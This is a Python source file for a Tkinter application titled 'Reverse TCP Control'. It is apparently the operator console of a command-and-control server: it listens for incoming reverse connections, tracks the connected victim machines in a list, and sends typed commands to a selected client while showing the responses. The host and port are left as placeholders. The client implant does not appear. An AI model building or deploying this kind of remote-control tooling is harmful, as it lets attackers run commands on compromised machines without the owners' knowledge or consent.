import socket
from _thread import *
from tkinter import *
import tkinter as tk
from tkinter import ttk

# Socket Variables
SOCKET_HOST = ADDRESS
SOCKET_PORT = PORT
BUFFER_SIZE = 1048576
THREAD_COUNT = 0
# User Interface Variables
UI = Tk()
TabControl = ttk.Notebook(UI)
Clients = ttk.Frame(TabControl)
Console = ttk.Frame(TabControl)
# Console and Client List
Lb1 = Listbox(Clients, width=450, height=450)
ClientList=[]
output = Text(Console, bd=3)

# Socket Setup
s = socket.socket()
s.bind((SOCKET_HOST, SOCKET_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)

'''
Design Each Tab in UI
'''
def ConsoleTabSetup():
    SendOutput(f'[!] Listening as {SOCKET_HOST}:{SOCKET_PORT}')
    output.pack()
    command = Text(Console, width=62, height=1)
    command.pack()
def ClientsTabSetup():
    Lb1.insert(0, 'Total Clients: '+str(THREAD_COUNT))
    Lb1.pack()
    Lb1.bind('<<ListboxSelect>>', PayloadWindowHandler)
def PayloadWindowHandler(event):
    def btnSendCommand():
        ip=((PayloadWindow.title()).split(':'))[0]
        port=((PayloadWindow.title()).split(':'))[1]
        address = (ip, int(port))
        Client = GetClient(address)
        Client.send(str.encode(command.get('1.0',END)))
    if len(Lb1.curselection()) > 0 and (Lb1.curselection())[0] != 0:
        PayloadWindow = Toplevel(UI)
        PayloadWindow.title(Lb1.get(Lb1.curselection()))
        PayloadWindow.geometry('300x300')
        command = Text(PayloadWindow, width=36, height=1, bd=3)
        btnSendCommand = Button(PayloadWindow, width=10, height=0, text='Send', command=btnSendCommand).place(x=0, y=25)
        command.pack()   
'''
Setup Tab Control
'''
def TabControlSetup():
    TabControl.add(Console, text='Console')
    TabControl.add(Clients, text='Clients')
    TabControl.pack(expan=1, fill='both')
'''
Socket Functions
'''
def Connect(host, port):
    while True:
        Client, address = s.accept()
        ClientList.append(Client)
        UserConnected(address)
        start_new_thread(Threaded_Client, (Client, address, ))
def Threaded_Client(Client, address):
    Client.send(str.encode('[!] Connection to server has been established'))
    while True:
        try:
            response = Client.recv(BUFFER_SIZE).decode()
            SendOutput(response)
        except socket.error as e:
            RemoveClient(address)
            break
    UserDisconnected(address)
    Client.close()
def GetClient(address):
    for Client in ClientList:
        if(Client.getpeername() == address):
            return Client
def RemoveClient(address):
    for Client in ClientList:
        if(Client.getpeername() == address):
            ClientList.remove(Client)
'''
Update User Interface
'''
def SendOutput(Message):
    output.config(state=NORMAL)
    output.insert(tk.END, (Message + '\n'))
    output.config(state=DISABLED)
def UserConnected(address):
    global THREAD_COUNT
    THREAD_COUNT += 1
    UpdateThreadCount()
    SendOutput(f'[+] User Connected {address[0]}:{address[1]}')
    Lb1.insert(Lb1.size(), f'{address[0]}:{address[1]}')
def UserDisconnected(address):
    RemoveClient(address)
    global THREAD_COUNT
    THREAD_COUNT -= 1
    UpdateThreadCount()
    SendOutput((f'[-] User Disconnected {address[0]}:{address[1]}'))
    index = Lb1.get(0, tk.END).index((f'{address[0]}:{address[1]}'))
    Lb1.delete(index)
def UpdateThreadCount():
    Lb1.delete(0)
    Lb1.insert(0, "Total Clients: "+str(THREAD_COUNT))
'''
Build User Interface
'''
def Main():
    # Main UI Setup
    UI.title('Reverse TCP Control')
    UI.geometry('500x500')
    UI.resizable(False, False)
    # Setup for Tab Control
    ClientsTabSetup()
    ConsoleTabSetup()
    TabControlSetup()
    # Socket Connection Thread
    start_new_thread(Connect, (SOCKET_HOST, SOCKET_PORT, ))

# Run Main Function
Main()

# Lets Tkinter start running the application
mainloop()